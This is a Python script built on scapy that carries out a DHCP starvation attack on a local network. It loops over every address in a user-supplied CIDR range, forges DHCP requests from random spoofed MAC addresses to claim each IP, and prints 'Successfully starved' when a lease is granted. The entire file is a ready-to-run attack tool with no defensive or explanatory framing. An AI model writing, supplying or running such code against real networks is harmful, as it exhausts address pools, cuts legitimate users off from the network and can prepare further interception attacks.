from scapy.all import *
import argparse
import ipaddress
from threading import Thread
from time import sleep

class SpoofedPacket():
    def __init__(self, src_mac, spoof_ip):
        self.src_mac = src_mac
        self.spoof_ip = spoof_ip
        self.broadcast_mac = 'ff:ff:ff:ff:ff:ff'
        conf.checkIPaddr = False

    @property
    def dhcp_request(self):
        dhcp_r_packet = Ether(src=self.src_mac, dst=self.broadcast_mac) \
            /IP(src='0.0.0.0', dst='255.255.255.255') \
            /UDP(sport=68, dport=67) \
            /BOOTP(chaddr=self.src_mac) \
            /DHCP(options=[('message-type', 'request'), ("requested_addr", self.spoof_ip), ('server_id', '192.168.1.1'), 'end'])
        return dhcp_r_packet

def send_and_listen(packet, ip):
    for i in range(10):
        ans = srp1(packet.dhcp_request, timeout=.2)
        if ans is not None:
            print('['+str(ip)+'] - Successfully starved')
            break
        else:
            if i == 9:
                print('[-] Could not starve')
            else:
                pass

def main():
    parser = argparse.ArgumentParser(description='Get arguments')
    parser.add_argument('ip_network', type=str, help='enter IP address range in CIDR notation (e.g. 192.168.1.0/24)')
    parser.add_argument('my_ip', type=str, help='Enter your own IP')
    args = parser.parse_args()

    ip_network = args.ip_network
    my_ip = args.my_ip


    for ip in ipaddress.IPv4Network(ip_network):
        if str(ip) != my_ip:
            print("Starving "+ str(ip))
            mac = RandMAC()
            packet = SpoofedPacket(mac, ip)
            send_and_listen(packet, ip)





if __name__ == '__main__':
    main()
